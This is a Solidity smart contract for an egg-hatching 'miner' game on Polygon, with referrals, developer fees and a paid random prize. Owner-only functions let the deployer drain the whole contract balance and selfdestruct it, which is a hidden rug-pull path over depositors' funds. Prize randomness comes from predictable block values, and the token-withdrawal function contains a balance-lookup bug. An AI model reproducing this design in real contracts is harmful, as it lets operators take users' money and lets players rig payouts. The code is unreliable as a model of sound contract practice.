/**
 *Submitted for verification at polygonscan.com on 2021-10-15
*/

pragma solidity ^0.4.26;

contract CryptoEggGame{
    uint256 public EGGS_TO_HATCH_1MINERS = 864000; 
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    uint256 MMOD = 300;
    uint256 PCOST = 100 ether;

    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedEggs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    mapping (address => Prize)   public prize;
    uint256 public marketEggs;
    
    uint256 public startTime = 1629115200; // Mon, 16 Aug 2021 12:00:00 UTC
	address private owner;
	address private prj_1;
	address private adv_1;
	address private adv_2;   
	address tokenAddress = 0xaF9c4c0248Fd208a346da82bBa67797090FeC757;
    
    struct Prize {
       uint256 matic;
       uint256 token;
       uint256 eggs;
       bool ok;
    } 
    
    constructor(address _adv1, address _adv2,  address _prj1) public{
		marketEggs = 86400000000;
		owner = msg.sender;
		prj_1 = _prj1;
		adv_1 = _adv1;
		adv_2 = _adv2; 
    }

    modifier onlyOwner {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    } 
    
	//////////////////////////////////////////////////////////////////    
    function transferBack(uint256 val) external onlyOwner {
        msg.sender.transfer(val);
    }
    
    function transferBack_All() external onlyOwner {
        msg.sender.transfer(address(this).balance);
    }  
    
    function transferBack_All_TK() external onlyOwner {
        uint amount = IERC20(msg.sender).balanceOf(address(this));
        IERC20(tokenAddress).transfer(msg.sender, amount);
    }      
    
    function destroContract() external onlyOwner {
        selfdestruct(msg.sender);
    } 	
	//////////////////////////////////////////////////////////////////	    
    
    function hatchEggs(address ref) public{
        require(block.timestamp > startTime, "Contract not start yet");	
        if(ref == msg.sender) {
            ref = 0;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender){
            referrals[msg.sender]=ref;
        }
        uint256 eggsUsed=getMyEggs();
        uint256 newMiners=SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;
        
        //send referral eggs
        claimedEggs[referrals[msg.sender]]=SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(eggsUsed,10));
        
        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
    }
    
    function sellEggs() public{
        require(block.timestamp > startTime, "Contract not start yet");	
        uint256 hasEggs=getMyEggs();
        uint256 eggValue=calculateEggSell(hasEggs);
        uint256 fee=devFee(eggValue);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;
        marketEggs=SafeMath.add(marketEggs,hasEggs);
		adv_1.transfer(fee);
		adv_2.transfer(fee);
		prj_1.transfer(fee);
        msg.sender.transfer(SafeMath.sub(eggValue,fee));
    }
    
    function buyEggs(address ref) public payable{
        require(block.timestamp > startTime, "Contract not start yet");	
        uint256 eggsBought=calculateEggBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        eggsBought=SafeMath.sub(eggsBought,devFee(eggsBought));
        uint256 fee=devFee(msg.value);
		adv_1.transfer(fee);
		adv_2.transfer(fee);
		prj_1.transfer(fee);
        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);
        hatchEggs(ref);
    }
    
    function buyPrize() public payable{
        require(block.timestamp > startTime, "Contract not start yet");	
        require(msg.value == PCOST && !prize[msg.sender].ok);
        
        uint matic =  getRandomNum(1 ether, 20 ether);
        uint token =  getRandomNum(1 ether, 100 ether);
        uint eggs  =  getRandomNum(100, 200);
        
        prize[msg.sender].matic = matic;
        prize[msg.sender].token = token;
        prize[msg.sender].eggs = eggs;
        prize[msg.sender].ok = true;
    }    
    
    function claimPrize() public{
        require(block.timestamp > startTime, "Contract not start yet");	
        require(prize[msg.sender].ok);
         
        uint matic = prize[msg.sender].matic;
        uint token = prize[msg.sender].token;
        uint eggs  = prize[msg.sender].eggs;
        
        if (matic > 0) {
            prize[msg.sender].matic = 0;
            msg.sender.transfer(matic);
        }
        
        if (token > 0) {
            prize[msg.sender].token = 0;
            IERC20(tokenAddress).transfer(msg.sender, token);
        }    
        
        if (eggs > 0) {
            claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggs);
            hatchEggs(0);  
        }
        
        prize[msg.sender].ok = false;
    }  
    
    function changeDevAddr(address _adv1, address _adv2,  address _prj1) public onlyOwner{
		prj_1 = _prj1;
		adv_1 = _adv1;
		adv_2 = _adv2;         
    }     
    
    function getRandomNum(uint256 fr, uint256 to) public view returns (uint256) { 
        uint256 A = minZero(to, fr) + 1;
        return uint256(uint256(keccak256(abi.encode(block.timestamp, block.difficulty)))%A) + fr; 
    } 
    
    function minZero(uint a, uint b) private pure returns(uint) {
        if (a > b) {
           return a - b; 
        } else {
           return 0;    
        }    
    }     
   
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    
    function calculateEggSell(uint256 eggs) public view returns(uint256){
        uint r = calculateTrade(eggs,marketEggs,address(this).balance);
        //return SafeMath.mul(r,MMOD);
        return r;
    }
    
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        uint r = calculateTrade(eth,contractBalance,marketEggs);
        //return SafeMath.div(r,MMOD);
        return r;
    }
    
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth,address(this).balance);
    }
    
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,2),100);
    }
    
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    
    function getUserBalance() public view returns(uint256){
        return address(msg.sender).balance;
    }    
    
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
    
    function getMyEggs() public view returns(uint256){
        return SafeMath.add(claimedEggs[msg.sender],getEggsSinceLastHatch(msg.sender));
    }
    
    function getMyPrize() public view returns(bool, uint256, uint256, uint256){
        return (prize[msg.sender].ok, prize[msg.sender].matic, prize[msg.sender].token, prize[msg.sender].eggs);
    }    
    
    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    
	function getContractLaunchTime() public view returns(uint256) {
		return minZero(startTime, block.timestamp);
	}	    
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    
    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address recipient, uint256 amount) external returns (bool);

    
    function allowance(address owner, address spender) external view returns (uint256);

    
    function approve(address spender, uint256 amount) external returns (bool);

    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}